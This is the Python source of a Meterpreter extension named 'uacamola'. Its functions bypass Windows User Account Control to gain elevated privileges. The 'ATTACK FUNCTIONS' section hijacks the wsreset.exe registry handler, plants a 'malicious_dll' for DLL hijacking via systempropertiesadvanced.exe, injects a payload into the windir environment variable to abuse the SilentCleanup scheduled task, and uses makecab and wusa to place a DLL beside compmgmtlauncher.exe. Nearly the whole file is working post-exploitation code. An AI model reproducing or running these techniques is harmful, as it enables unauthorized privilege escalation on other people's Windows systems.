# Thanks to ext_server_stdapi.py
# There is still a way to go
# Cleaning and extension...

import fnmatch
import getpass
import glob
import os
import platform
import re
import shlex
import shutil
import socket
import stat
import struct
import subprocess
import sys
import time

try:
    import ctypes
    import ctypes.util
    has_ctypes = True
    has_windll = hasattr(ctypes, 'windll')
except ImportError:
    has_ctypes = False
    has_windll = False

try:
    import pty
    has_pty = True
except ImportError:
    has_pty = False

try:
    import pwd
    has_pwd = True
except ImportError:
    has_pwd = False

try:
    import termios
    has_termios = True
except ImportError:
    has_termios = False

try:
    import winreg
    has_winreg = True
except ImportError:
    try:
        import _winreg as winreg
        has_winreg = True
    except ImportError:
        winreg = None
        has_winreg = False

try:
    WindowsError
except NameError:
    WindowsError = OSError


def to_text(value):
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="ignore")
    if value is None:
        return ""
    return str(value)


# TLV DEFINITION

#
# TLV Meta Types
#
TLV_META_TYPE_NONE = 0
TLV_META_TYPE_STRING = (1 << 16)
TLV_META_TYPE_UINT = (1 << 17)
TLV_META_TYPE_RAW = (1 << 18)
TLV_META_TYPE_BOOL = (1 << 19)
TLV_META_TYPE_QWORD = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP = (1 << 30)
TLV_META_TYPE_COMPLEX = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1 << 31) + (1 << 30) + (1 << 29) + (1 << 19) + (1 << 18) + (1 << 17) + (1 << 16)
# More TLV
TLV_EXTENSIONS = 20000
TLV_TYPE_PYTHON_RESULT = TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 8)
TLV_TYPE_PROCESS_PATH = TLV_META_TYPE_STRING | 2302

# TLV DEFINITION END

##
# Errors
##
ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

meterpreter.register_extension('uacamola')

# Meterpreter register function decorators
register_function = meterpreter.register_function


def register_function_if(condition):
    if condition:
        return meterpreter.register_function
    return lambda function: function


# GENERAL FUNCTIONS BEGIN

@register_function
def uacamola_start_uacamola(request, response):
    return return_success(response, "Bye")


# GENERAL FUNCTIONS END


# INVESTIGATE FUNCTIONS BEGIN

@register_function
def autoelevate_search(request, response):
    files_auto = []
    try:
        my_path = to_text(packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"])
        f_exe = glob.glob(my_path + os.sep + "*.exe")
        for f in f_exe:
            if check_auto_elevate_aux(f):
                files_auto.append(f)
    except Exception:
        pass
    files_auto = ";".join(files_auto)
    return return_success(response, files_auto)


# INVESTIGATE FUNCTIONS END

# ATTACK FUNCTIONS BEGIN

@register_function
def fileless_wsreset(request, response):
    if not has_winreg:
        return return_error(response, "winreg is not available in this meterpreter runtime")

    hkcu = winreg.HKEY_CURRENT_USER
    reg = Registry()
    path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
    instruction = to_text(packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"])
    key = reg.create_key(hkcu, path)
    if not key:
        return return_error(response, "Failure creating registry")

    reg.set_value(hkcu, path, instruction)
    run_binary(r"C:\Windows\System32\wsreset.exe")
    return return_success(response, "Done!")


@register_function
def systempropertiesadvanced(request, response):
    malicious_dll = to_text(packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"])
    try:
        res = subprocess.Popen(["whoami"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, _stderr = res.communicate()
        user = to_text(stdout).split("\\")[1].strip()
    except Exception as error:
        return return_error(response, str(error))

    path = "C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\WindowsApps"
    if not os.path.isdir(path):
        os.mkdir(path)

    dst = path + r"\srrstr.dll"
    try:
        shutil.copy(src=malicious_dll, dst=dst)
        run_binary(r"C:\Windows\syswow64\systempropertiesadvanced.exe")
        return return_success(response, "Done!")
    except Exception as error:
        return return_error(response, str(error))


@register_function
def variable_injection(request, response):
    if not has_winreg:
        return return_error(response, "winreg is not available in this meterpreter runtime")

    hkcu = winreg.HKEY_CURRENT_USER
    payload = to_text(packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"])
    reg = Registry()
    key = reg.create_key(hkcu, "Environment")
    if not key:
        return return_error(response, "Failure creating registry")

    reg.create_value(key, "windir", payload)
    run_binary(r"schtasks /RUN /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I")
    return return_success(response, "Done!")


@register_function
def dll_hijacking_wusa(request, response):
    binary = "compmgmtlauncher.exe"
    destination = r"C:\Windows\System32"

    raw_value = to_text(packet_get_tlv(request, TLV_TYPE_PYTHON_RESULT)["value"])
    try:
        data = shlex.split(raw_value, posix=False)
    except Exception:
        data = raw_value.split(" ")

    if len(data) < 2:
        return return_error(response, "Invalid arguments. Expected: <dll_path> <folder>")

    payload = data[0]
    folder = data[1]
    name_dll = payload.split("\\")[-1]
    complete_path = binary + ".Local\\" + folder + "\\"

    try:
        subprocess.check_call(["powershell", "-C", "mkdir", complete_path, ">", "$null"])
        subprocess.check_call(["powershell", "-C", "copy", payload, complete_path, ">", "$null"])

        ddf = (
            ".OPTION EXPLICIT\r\n\r\n.Set CabinetNameTemplate=mycab.CAB\r\n"
            ".Set DiskDirectoryTemplate=.\r\n\r\n.Set Cabinet=on\n.Set Compress=on\n"
            ".Set DestinationDir=" + binary + ".Local\\" + folder + "\r\n \""
            + binary + ".Local\\" + folder + "\\" + name_dll + "\""
        )
        with open("proof.ddf", "w") as file_handle:
            file_handle.write(ddf)

        subprocess.check_call(["powershell", "-C", "makecab.exe", "/f", "proof.ddf", ">", "$null"])

        cab = os.getcwd() + "\\mycab.cab"
        extract = "/extract:" + destination
        subprocess.check_call(["powershell", "-C", "wusa.exe", cab, extract, ">", "$null"])

        subprocess.check_call(["powershell", "-C", binary])

        path = binary + ".Local"
        subprocess.check_call(["powershell", "-C", "rmdir", "-Recurse", path, ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "proof.ddf", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "setup.inf", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "setup.rpt", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "mycab.CAB", ">", "$null"])
    except Exception as error:
        return return_error(response, str(error))

    return return_success(response, "Done!")


# ATTACK FUNCTIONS END

# AUXILIAR FUNCTIONS BEGIN


def return_success(response, result):
    response += tlv_pack(TLV_TYPE_PYTHON_RESULT, result)
    return ERROR_SUCCESS, response


def return_error(response, error):
    response += tlv_pack(TLV_TYPE_PYTHON_RESULT, error)
    return ERROR_FAILURE, response


def check_auto_elevate_aux(path_to_binary):
    try:
        with open(path_to_binary, "rb") as file_handle:
            return b"<autoElevate>true</autoElevate>" in file_handle.read()
    except Exception:
        return False


def run_binary(binary, args=None):
    payload = binary
    if args:
        payload += " " + " ".join(args)
    os.popen(payload)


# AUXILIAR FUNCTIONS END


# REGISTRY CLASS

class Registry(object):

    def __init__(self):
        self.last_created = {'key': None,
                             'new_sk': None,
                             'existing_sk': None}
        self.no_restore = False

    def create_key(self, key, subkey):
        """Creates a key THAT DOESN'T EXIST, we need to keep track of the keys that we are creating."""
        self.no_restore = False
        self.non_existent_path(key, subkey)
        try:
            return winreg.CreateKey(key, subkey)
        except (WindowsError, OSError):
            self.no_restore = True
            return None

    def restore(self, key, value=''):
        """Restore to the last registry known state."""
        if self.no_restore is False:
            new_sk = self.last_created['new_sk']
            parent_key = self.last_created['key']
            exist_sk = self.last_created['existing_sk']

            self.del_value(key, value)

            if new_sk is not None:
                for i in range(len(new_sk)):
                    if i == 0:
                        try:
                            winreg.DeleteKey(parent_key, "\\".join(exist_sk + new_sk))
                        except (WindowsError, OSError):
                            return None
                    else:
                        try:
                            winreg.DeleteKey(parent_key, "\\".join(exist_sk + new_sk[:-i]))
                        except (WindowsError, OSError):
                            return None

                self.last_created['new_sk'] = None
                self.last_created['existing_sk'] = None
                self.last_created['key'] = None
        return True

    def non_existent_path(self, key, subkey):
        """In a key path, returns the portion of the path that doesn't exist."""
        subkeys = subkey.split('\\')
        for i in range(1, len(subkeys) + 1):
            try:
                winreg.OpenKey(key, "\\".join(subkeys[:i]))
            except (WindowsError, OSError):
                self.last_created['key'] = key
                self.last_created['new_sk'] = subkeys[i - 1:]
                self.last_created['existing_sk'] = subkeys[:i - 1]
                return "\\".join(subkeys[i - 1:])

    def set_value(self, key, subkey, value):
        """Set a value in a custom subkey."""
        try:
            return winreg.SetValue(key, subkey, winreg.REG_SZ, value)
        except Exception:
            self.no_restore = True
            return None

    def del_value(self, key, value=''):
        if self.no_restore is False:
            try:
                return winreg.DeleteValue(key, value)
            except (WindowsError, OSError):
                return None

    def create_value(self, key, value_name, value):
        """Creates a value THAT DOESN'T EXIST, we need to keep track of the keys that we are creating."""
        self.no_restore = False
        try:
            return winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value)
        except (WindowsError, OSError):
            self.no_restore = True
            return None

    def delete_key(self, key, subkey):
        """Deletes a particular key."""
        try:
            return winreg.DeleteKey(key, subkey)
        except (WindowsError, OSError):
            return None

    def open_key(self, key, subkey):
        """Opens a key."""
        try:
            return winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
        except Exception:
            return None
